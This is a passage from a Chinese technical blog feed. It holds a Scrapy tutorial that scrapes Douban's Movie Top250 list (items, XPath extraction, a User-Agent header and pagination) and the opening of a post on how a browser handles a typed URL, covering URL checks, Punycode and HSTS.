    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>经过<a href="http://woodenrobot.me/2017/01/01/scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%80%EF%BC%89-Scrapy%E5%85%A5%E9%97%A8/">上一篇教程</a>我们已经大致了解了Scrapy的基本情况，并写了一个简单的小demo。这次我会以爬取豆瓣电影TOP250为例进一步为大家讲解一个完整爬虫的流程。</p>
<span id="more"></span>
<h1 id="工具和环境"><a href="#工具和环境" class="headerlink" title="工具和环境"></a>工具和环境</h1><ol>
<li>语言：python 2.7</li>
<li>IDE： Pycharm</li>
<li>浏览器：Chrome</li>
<li>爬虫框架：Scrapy 1.2.1</li>
</ol>
<h1 id="教程正文"><a href="#教程正文" class="headerlink" title="教程正文"></a>教程正文</h1><h2 id="观察页面结构"><a href="#观察页面结构" class="headerlink" title="观察页面结构"></a>观察页面结构</h2><p>首先我们打开<a href="https://movie.douban.com/top250">豆瓣电影TOP250</a>的页面<br><img src="/images/Scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E6%95%99%E7%A8%8B%EF%BC%88%E4%BA%8C%EF%BC%89--%20%E7%88%AC%E5%8F%96%E8%B1%86%E7%93%A3%E7%94%B5%E5%BD%B1TOP250QQ%E5%9B%BE%E7%89%8720170107172029.png"><br>通过观察页面决定让我们的爬虫获取每一部电影的排名、电影名称、评分和评分的人数。</p>
<h2 id="声明Item"><a href="#声明Item" class="headerlink" title="声明Item"></a>声明Item</h2><p>什么是Items呢？<a href="http://scrapy-chs.readthedocs.io/zh_CN/1.0/topics/items.html">官方文档Items定义</a>如下：</p>
<blockquote>
<p>Items</p>
<p>爬取的主要目标就是从非结构性的数据源提取结构性数据，例如网页。 Scrapy spider可以以python的dict来返回提取的数据.虽然dict很方便，并且用起来也熟悉，但是其缺少结构性，容易打错字段的名字或者返回不一致的数据，尤其在具有多个spider的大项目中。</p>
<p>为了定义常用的输出数据，Scrapy提供了 Item 类。 Item 对象是种简单的容器，保存了爬取到得数据。 其提供了 类似于词典(dictionary-like) 的API以及用于声明可用字段的简单语法。</p>
<p>许多Scrapy组件使用了Item提供的额外信息: exporter根据Item声明的字段来导出数据、 序列化可以通过Item字段的元数据(metadata)来定义、 trackref 追踪Item实例来帮助寻找内存泄露 (see 使用 trackref 调试内存泄露) 等等。</p>
</blockquote>
<p>Item使用简单的class定义语法以及Field对象来声明。我们打开scrapyspider目录下的items.py文件写入下列代码声明Item：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DoubanMovieItem</span>(scrapy.Item):</span><br><span class="line">    <span class="comment"># 排名</span></span><br><span class="line">    ranking = scrapy.Field()</span><br><span class="line">    <span class="comment"># 电影名称</span></span><br><span class="line">    movie_name = scrapy.Field()</span><br><span class="line">    <span class="comment"># 评分</span></span><br><span class="line">    score = scrapy.Field()</span><br><span class="line">    <span class="comment"># 评论人数</span></span><br><span class="line">    score_num = scrapy.Field()</span><br></pre></td></tr></table></figure>
<h2 id="爬虫程序"><a href="#爬虫程序" class="headerlink" title="爬虫程序"></a>爬虫程序</h2><p>在scrapyspider/spiders目录下创建douban_spider.py文件，并写入初步的代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scrapy.spiders <span class="keyword">import</span> Spider</span><br><span class="line"><span class="keyword">from</span> scrapyspider.items <span class="keyword">import</span> DoubanMovieItem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DoubanMovieTop250Spider</span>(<span class="title class_ inherited__">Spider</span>):</span><br><span class="line">    name = <span class="string">&#x27;douban_movie_top250&#x27;</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;https://movie.douban.com/top250&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">        item = DoubanMovieItem()</span><br></pre></td></tr></table></figure>
<p>这个一个基本的scrapy的spider的model，首先我们要导入Scrapy.spiders中的Spider类，以及scrapyspider.items中我们刚刚定义好的DoubanMovieItem。<br>接着创建我们自己的爬虫类DoubanMovieTop250Spider并继承Spider类，scrapy.spiders中有很多不同的爬虫类可供我们继承，一般情况下使用Spider类就可以满足要求。（其他爬虫类的使用可以去参考<a href="http://scrapy-chs.readthedocs.io/zh_CN/1.0/topics/spiders.html">官方文档</a>）。  </p>
<blockquote>
<p>Spider </p>
<p>class scrapy.spider.Spider  </p>
<p>Spider是最简单的spider。每个其他的spider必须继承自该类(包括Scrapy自带的其他spider以及您自己编写的spider)。 Spider并没有提供什么特殊的功能。 其仅仅请求给定的 start_urls/start_requests ，并根据返回的结果(resulting responses)调用spider的 parse 方法。</p>
</blockquote>
<blockquote>
<p>name<br>定义spider名字的字符串(string)。spider的名字定义了Scrapy如何定位(并初始化)spider，所以其必须是唯一的。 不过您可以生成多个相同的spider实例(instance)，这没有任何限制。 name是spider最重要的属性，而且是必须的。</p>
<p>如果该spider爬取单个网站(single domain)，一个常见的做法是以该网站(domain)(加或不加 后缀 )来命名spider。 例如，如果spider爬取 mywebsite.com ，该spider通常会被命名为 mywebsite 。</p>
</blockquote>
<blockquote>
<p>allowed_domains<br>可选。包含了spider允许爬取的域名(domain)列表(list)。 当 OffsiteMiddleware 启用时， 域名不在列表中的URL不会被跟进。</p>
</blockquote>
<blockquote>
<p>start_urls<br>URL列表。当没有制定特定的URL时，spider将从该列表中开始进行爬取。 因此，第一个被获取到的页面的URL将是该列表之一。 后续的URL将会从获取到的数据中提取。</p>
</blockquote>
<blockquote>
<p>start_requests()<br>该方法必须返回一个可迭代对象(iterable)。该对象包含了spider用于爬取的第一个Request。</p>
<p>当spider启动爬取并且未制定URL时，该方法被调用。 当指定了URL时，make_requests_from_url() 将被调用来创建Request对象。 该方法仅仅会被Scrapy调用一次，因此您可以将其实现为生成器。</p>
<p>该方法的默认实现是使用 start_urls 的url生成Request。</p>
<p>如果您想要修改最初爬取某个网站的Request对象，您可以重写(override)该方法。 例如，如果您需要在启动时以POST登录某个网站，你可以这么写:</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">start_requests</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">return</span> [scrapy.FormRequest(<span class="string">&quot;http://www.example.com/login&quot;</span>,</span><br><span class="line">                               formdata=&#123;<span class="string">&#x27;user&#x27;</span>: <span class="string">&#x27;john&#x27;</span>, <span class="string">&#x27;pass&#x27;</span>: <span class="string">&#x27;secret&#x27;</span>&#125;,</span><br><span class="line">                               callback=self.logged_in)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logged_in</span>(<span class="params">self, response</span>):</span><br><span class="line">    <span class="comment"># here you would extract links to follow and return Requests for</span></span><br><span class="line">    <span class="comment"># each of them, with another callback</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>make_requests_from_url(url)<br>该方法接受一个URL并返回用于爬取的 Request 对象。 该方法在初始化request时被 start_requests() 调用，也被用于转化url为request。</p>
<p>默认未被复写(overridden)的情况下，该方法返回的Request对象中， parse() 作为回调函数，dont_filter参数也被设置为开启。 (详情参见 Request).</p>
</blockquote>
<blockquote>
<p>parse(response)<br>当response没有指定回调函数时，该方法是Scrapy处理下载的response的默认方法。</p>
<p>parse 负责处理response并返回处理的数据以及(/或)跟进的URL。 Spider 对其他的Request的回调函数也有相同的要求。</p>
<p>该方法及其他的Request回调函数必须返回一个包含 Request 及(或) Item 的可迭代的对象。</p>
<p>参数:    response (Response) – 用于分析的response</p>
</blockquote>
<blockquote>
<p>log(message[, level, component])<br>使用 scrapy.log.msg() 方法记录(log)message。 log中自动带上该spider的 name 属性。 更多数据请参见 Logging 。</p>
</blockquote>
<blockquote>
<p>closed(reason)<br>当spider关闭时，该函数被调用。 该方法提供了一个替代调用signals.connect()来监听 spider_closed 信号的快捷方式。  </p>
</blockquote>
<h2 id="提取网页信息"><a href="#提取网页信息" class="headerlink" title="提取网页信息"></a>提取网页信息</h2><p>我们使用xpath语法来提取我们所需的信息。<br>不熟悉xpath语法的可以在<a href="http://www.w3school.com.cn/xpath/index.asp">W3School网站</a>学习一下，很快就能上手。<br>首先我们在chrome浏览器里进入豆瓣电影TOP250页面并按F12打开开发者工具。<br><img src="/images/Scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E6%95%99%E7%A8%8B%EF%BC%88%E4%BA%8C%EF%BC%89--%20%E7%88%AC%E5%8F%96%E8%B1%86%E7%93%A3%E7%94%B5%E5%BD%B1TOP250QQ%E5%9B%BE%E7%89%8720170107180752.png"><br>点击工具栏左上角的类鼠标符号图标或者Ctrl + Shift + c在页面中点击我们想要的元素即可在工具栏中看到它在网页HTML源码中所处的位置。<br>一般抓取时会以先抓大再抓小的原则来抓取。通过观察我们看到该页面所有影片的信息都位于一个class属性为grid_view的ol标签内的li标签内。  </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span> <span class="attr">class</span>=<span class="string">&quot;grid_view&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;pic&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">em</span> <span class="attr">class</span>=<span class="string">&quot;&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">em</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://movie.douban.com/subject/1292052/&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">img</span> <span class="attr">alt</span>=<span class="string">&quot;肖申克的救赎&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://img3.doubanio.com/view/movie_poster_cover/ipst/public/p480747492.jpg&quot;</span> <span class="attr">class</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;hd&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://movie.douban.com/subject/1292052/&quot;</span> <span class="attr">class</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span>&gt;</span>肖申克的救赎<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span>&gt;</span><span class="symbol">&amp;nbsp;</span>/<span class="symbol">&amp;nbsp;</span>The Shawshank Redemption<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;other&quot;</span>&gt;</span><span class="symbol">&amp;nbsp;</span>/<span class="symbol">&amp;nbsp;</span>月黑高飞(港)  /  刺激1995(台)<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;playable&quot;</span>&gt;</span>[可播放]<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;bd&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">                            导演: 弗兰克·德拉邦特 Frank Darabont<span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span>主演: 蒂姆·罗宾斯 Tim Robbins /...<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                            1994<span class="symbol">&amp;nbsp;</span>/<span class="symbol">&amp;nbsp;</span>美国<span class="symbol">&amp;nbsp;</span>/<span class="symbol">&amp;nbsp;</span>犯罪 剧情</span><br><span class="line">                        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                        </span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;star&quot;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;rating5-t&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;rating_num&quot;</span> <span class="attr">property</span>=<span class="string">&quot;v:average&quot;</span>&gt;</span>9.6<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">span</span> <span class="attr">property</span>=<span class="string">&quot;v:best&quot;</span> <span class="attr">content</span>=<span class="string">&quot;10.0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">span</span>&gt;</span>766719人评价<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                            <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;quote&quot;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;inq&quot;</span>&gt;</span>希望让人自由。<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        ...</span><br><span class="line">        ...</span><br><span class="line">        ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>因此我们根据以上原则对所需信息进行抓取</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scrapy.spiders <span class="keyword">import</span> Spider</span><br><span class="line"><span class="keyword">from</span> scrapyspider.items <span class="keyword">import</span> DoubanMovieItem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DoubanMovieTop250Spider</span>(<span class="title class_ inherited__">Spider</span>):</span><br><span class="line">    name = <span class="string">&#x27;douban_movie_top250&#x27;</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;https://movie.douban.com/top250&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">        item = DoubanMovieItem()</span><br><span class="line">        movies = response.xpath(<span class="string">&#x27;//ol[@class=&quot;grid_view&quot;]/li&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> movie <span class="keyword">in</span> movies:</span><br><span class="line">            item[<span class="string">&#x27;ranking&#x27;</span>] = movie.xpath(</span><br><span class="line">                <span class="string">&#x27;.//div[@class=&quot;pic&quot;]/em/text()&#x27;</span>).extract()[<span class="number">0</span>]</span><br><span class="line">            item[<span class="string">&#x27;movie_name&#x27;</span>] = movie.xpath(</span><br><span class="line">                <span class="string">&#x27;.//div[@class=&quot;hd&quot;]/a/span[1]/text()&#x27;</span>).extract()[<span class="number">0</span>]</span><br><span class="line">            item[<span class="string">&#x27;score&#x27;</span>] = movie.xpath(</span><br><span class="line">                <span class="string">&#x27;.//div[@class=&quot;star&quot;]/span[@class=&quot;rating_num&quot;]/text()&#x27;</span></span><br><span class="line">            ).extract()[<span class="number">0</span>]</span><br><span class="line">            item[<span class="string">&#x27;score_num&#x27;</span>] = movie.xpath(</span><br><span class="line">                <span class="string">&#x27;.//div[@class=&quot;star&quot;]/span/text()&#x27;</span>).re(u<span class="string">r&#x27;(\d+)人评价&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">yield</span> item</span><br></pre></td></tr></table></figure>
<p><strong>对于Scrapy提取页面信息的内容详情可以参照<a href="http://scrapy-chs.readthedocs.io/zh_CN/1.0/topics/selectors.html">官方文档的相应章节</a>。</strong></p>
<h2 id="运行爬虫"><a href="#运行爬虫" class="headerlink" title="运行爬虫"></a>运行爬虫</h2><p>在项目文件夹内打开cmd运行下列命令：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">scrapy crawl douban_movie_top250 -o douban.csv</span><br></pre></td></tr></table></figure>
<p><strong>注意此处的douban_movie_top250即为我们刚刚写的爬虫的name, 而-o douban.csv是scrapy提供的将item输出为csv格式的快捷方式</strong>   </p>
<p>试着运行一下爬虫怎么什么也没输出呢？！！！<br><img src="/images/Scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E6%95%99%E7%A8%8B%EF%BC%88%E4%BA%8C%EF%BC%89--%20%E7%88%AC%E5%8F%96%E8%B1%86%E7%93%A3%E7%94%B5%E5%BD%B1TOP250QQ%E5%9B%BE%E7%89%8720170107182720.png"><br>辛辛苦苦到了这里难道要失败了吗？！！！<br>不要急我们看下一控制台输出的信息，原来是403错误了。这是因为豆瓣对爬虫设了一个小小的门槛，我们只需要更改一下发送请求时的请求头user-agent即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> Request</span><br><span class="line"><span class="keyword">from</span> scrapy.spiders <span class="keyword">import</span> Spider</span><br><span class="line"><span class="keyword">from</span> scrapyspider.items <span class="keyword">import</span> DoubanMovieItem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DoubanMovieTop250Spider</span>(<span class="title class_ inherited__">Spider</span>):</span><br><span class="line">    name = <span class="string">&#x27;douban_movie_top250&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">start_requests</span>(<span class="params">self</span>):</span><br><span class="line">        url = <span class="string">&#x27;https://movie.douban.com/top250&#x27;</span></span><br><span class="line">        <span class="keyword">yield</span> Request(url, headers=self.headers)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">        item = DoubanMovieItem()</span><br><span class="line">        movies = response.xpath(<span class="string">&#x27;//ol[@class=&quot;grid_view&quot;]/li&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> movie <span class="keyword">in</span> movies:</span><br><span class="line">            item[<span class="string">&#x27;ranking&#x27;</span>] = movie.xpath(</span><br><span class="line">                <span class="string">&#x27;.//div[@class=&quot;pic&quot;]/em/text()&#x27;</span>).extract()[<span class="number">0</span>]</span><br><span class="line">            item[<span class="string">&#x27;movie_name&#x27;</span>] = movie.xpath(</span><br><span class="line">                <span class="string">&#x27;.//div[@class=&quot;hd&quot;]/a/span[1]/text()&#x27;</span>).extract()[<span class="number">0</span>]</span><br><span class="line">            item[<span class="string">&#x27;score&#x27;</span>] = movie.xpath(</span><br><span class="line">                <span class="string">&#x27;.//div[@class=&quot;star&quot;]/span[@class=&quot;rating_num&quot;]/text()&#x27;</span></span><br><span class="line">            ).extract()[<span class="number">0</span>]</span><br><span class="line">            item[<span class="string">&#x27;score_num&#x27;</span>] = movie.xpath(</span><br><span class="line">                <span class="string">&#x27;.//div[@class=&quot;star&quot;]/span/text()&#x27;</span>).re(u<span class="string">r&#x27;(\d+)人评价&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">yield</span> item</span><br></pre></td></tr></table></figure>
<p>更改后的代码是不是觉得有些地方不太一样了？start_urls怎么不见了？start_re quests函数又是干什么的？还记得刚才对Spider类的介绍吗？先回过头复习一下上面关于start_urls和start_requests函数的介绍。简单的说就是使用start_requests函数我们对初始URL的处理就有了更多的权利，比如这次给初始URL增加请求头user_agent。</p>
<p>再次运行爬虫，我们想要的信息都被下载到douban.scv文件夹里了。直接用WPS打开即可查看信息。<br><img src="/images/Scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E6%95%99%E7%A8%8B%EF%BC%88%E4%BA%8C%EF%BC%89--%20%E7%88%AC%E5%8F%96%E8%B1%86%E7%93%A3%E7%94%B5%E5%BD%B1TOP250QQ%E5%9B%BE%E7%89%8720170107183811.png"></p>
<h2 id="自动翻页"><a href="#自动翻页" class="headerlink" title="自动翻页"></a>自动翻页</h2><p>先别急着高兴，你难道没有发现一个问题吗?这样的话我们还是只能爬到当前页的25个电影的内容。怎么样才能把剩下的也一起爬下来呢？<br>实现自动翻页一般有两种方法：</p>
<ol>
<li>在页面中找到下一页的地址；</li>
<li>自己根据URL的变化规律构造所有页面地址。</li>
</ol>
<p>一般情况下我们使用第一种方法，第二种方法适用于页面的下一页地址为JS加载的情况。今天我们只说第一种方法。<br>首先利用Chrome浏览器的开发者工具找到下一页的地址<br><img src="/images/Scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E6%95%99%E7%A8%8B%EF%BC%88%E4%BA%8C%EF%BC%89--%20%E7%88%AC%E5%8F%96%E8%B1%86%E7%93%A3%E7%94%B5%E5%BD%B1TOP250QQ%E5%9B%BE%E7%89%8720170107185053.png"><br>然后在解析该页面时获取下一页的地址并将地址交给调度器(Scheduler)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> Request</span><br><span class="line"><span class="keyword">from</span> scrapy.spiders <span class="keyword">import</span> Spider</span><br><span class="line"><span class="keyword">from</span> scrapyspider.items <span class="keyword">import</span> DoubanMovieItem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DoubanMovieTop250Spider</span>(<span class="title class_ inherited__">Spider</span>):</span><br><span class="line">    name = <span class="string">&#x27;douban_movie_top250&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">start_requests</span>(<span class="params">self</span>):</span><br><span class="line">        url = <span class="string">&#x27;https://movie.douban.com/top250&#x27;</span></span><br><span class="line">        <span class="keyword">yield</span> Request(url, headers=self.headers)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">        item = DoubanMovieItem()</span><br><span class="line">        movies = response.xpath(<span class="string">&#x27;//ol[@class=&quot;grid_view&quot;]/li&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> movie <span class="keyword">in</span> movies:</span><br><span class="line">            item[<span class="string">&#x27;ranking&#x27;</span>] = movie.xpath(</span><br><span class="line">                <span class="string">&#x27;.//div[@class=&quot;pic&quot;]/em/text()&#x27;</span>).extract()[<span class="number">0</span>]</span><br><span class="line">            item[<span class="string">&#x27;movie_name&#x27;</span>] = movie.xpath(</span><br><span class="line">                <span class="string">&#x27;.//div[@class=&quot;hd&quot;]/a/span[1]/text()&#x27;</span>).extract()[<span class="number">0</span>]</span><br><span class="line">            item[<span class="string">&#x27;score&#x27;</span>] = movie.xpath(</span><br><span class="line">                <span class="string">&#x27;.//div[@class=&quot;star&quot;]/span[@class=&quot;rating_num&quot;]/text()&#x27;</span></span><br><span class="line">            ).extract()[<span class="number">0</span>]</span><br><span class="line">            item[<span class="string">&#x27;score_num&#x27;</span>] = movie.xpath(</span><br><span class="line">                <span class="string">&#x27;.//div[@class=&quot;star&quot;]/span/text()&#x27;</span>).re(u<span class="string">r&#x27;(\d+)人评价&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">yield</span> item</span><br><span class="line"></span><br><span class="line">        next_url = response.xpath(<span class="string">&#x27;//span[@class=&quot;next&quot;]/a/@href&#x27;</span>).extract()</span><br><span class="line">        <span class="keyword">if</span> next_url:</span><br><span class="line">            next_url = <span class="string">&#x27;https://movie.douban.com/top250&#x27;</span> + next_url[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">yield</span> Request(next_url, headers=self.headers)</span><br></pre></td></tr></table></figure>
<p>最后再运行一下爬虫，打开douban.csv。是不是发现所有的影片信息都获取到了，250个一个不多一个不少。<br><img src="/images/Scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E6%95%99%E7%A8%8B%EF%BC%88%E4%BA%8C%EF%BC%89--%20%E7%88%AC%E5%8F%96%E8%B1%86%E7%93%A3%E7%94%B5%E5%BD%B1TOP250QQ%E5%9B%BE%E7%89%8720170107185753.png"><br>最后，利用WPS的筛选功能你可以筛选任意符合你要求的影片。（Ps:外来的和尚有时候不一定好念经。记得要用WPS打开这个CVS文件，用EXCEL打开会因为有中文而显示不正常。）</p>
<h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>从写这个Scrapy爬虫框架教程以来，我越来越觉得自己学会的东西再输出出去没有想象的那么简单，往往写了几个小时的教程最后发现还是没有想表达的东西表达完美。如果有什么说的不好的地方欢迎大家指正。闻道有先后，术业有专攻。大家互相学习: )<br>源码地址：<a href="https://github.com/Wooden-Robot/scrapy-tutorial">https://github.com/Wooden-Robot/scrapy-tutorial</a></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
        <tag>Scrapy</tag>
      </tags>
  </entry>
  <entry>
    <title>浏览器输入 URL 后的历程</title>
    <url>/2019/08/02/browswer-url/</url>
    <content><![CDATA[<h1 id="输入-URL"><a href="#输入-URL" class="headerlink" title="输入 URL"></a>输入 URL</h1><p>以访问”baidu.com”为例，当你按下“b”键，浏览器接收到这个消息之后，会触发自动完成机制。浏览器根据自己的算法，以及你是否处于隐私浏览模式，会在浏览器的地址框下方给出输入建议。大部分算法会优先考虑根据你的搜索历史和书签等内容给出建议。</p>
<h1 id="检测-URL"><a href="#检测-URL" class="headerlink" title="检测 URL"></a>检测 URL</h1><ul>
<li>第一步是浏览器对用户输入的网址做初步的格式化检查。<br>如果输入的 URL 是 bai du.com 或者 <a href="mailto:&#x62;&#x61;&#105;&#x40;&#x64;&#117;&#x2e;&#99;&#111;&#109;">&#x62;&#x61;&#105;&#x40;&#x64;&#117;&#x2e;&#99;&#111;&#109;</a> 这些为不正确的 URL，当协议或主机名不合法时，浏览器会将地址栏中输入的文字传给默认的搜索引擎。</li>
</ul>
<h1 id="转换非-ASCII-的-Unicode-字符"><a href="#转换非-ASCII-的-Unicode-字符" class="headerlink" title="转换非 ASCII 的 Unicode 字符"></a>转换非 ASCII 的 Unicode 字符</h1><ul>
<li>浏览器检查输入是否含有不是 a-z， A-Z，0-9， - 或者 . 的字符</li>
<li>这里 URL 是 baidu.com ，所以没有非ASCII的字符；如果有的话，浏览器会对主机名部分使用 Punycode 编码</li>
</ul>
<h1 id="检查-HSTS-列表"><a href="#检查-HSTS-列表" class="headerlink" title="检查 HSTS 列表"></a>检查 HSTS 列表</h1><ul>
<li>浏览器检查自带的“预加载 HSTS（HTTP严格传输安全）”列表，这个列表里包含了哪些请求浏览器只使用HTTPS进行连接的网站</li>
<li>如果网站在这个列表里，浏览器会使用 HTTPS 而不是 HTTP 协议，否则，最初的请求会使用HTTP协议发送</li>
<li>注意，一个网站哪怕不在 HSTS 列表里，也可以要求浏览器对自己使用 HSTS 政策进行访问。浏览器向网站发出第一个 HTTP 请求之后，网站会返回浏览器一个响应，请求浏览器只使用 HTTPS 发送请求。然而，就是这第一个 HTTP 请求，却可能会使用户受到 downgrade attack 的威胁（参考：<a href="https://zhuanlan.zhihu.com/p/22917510">HTTPS 协议降级攻击原理</a>），这也是为什么现代浏览器都预置了 HSTS 列表。</li>
</ul>
<span id="more"></span>

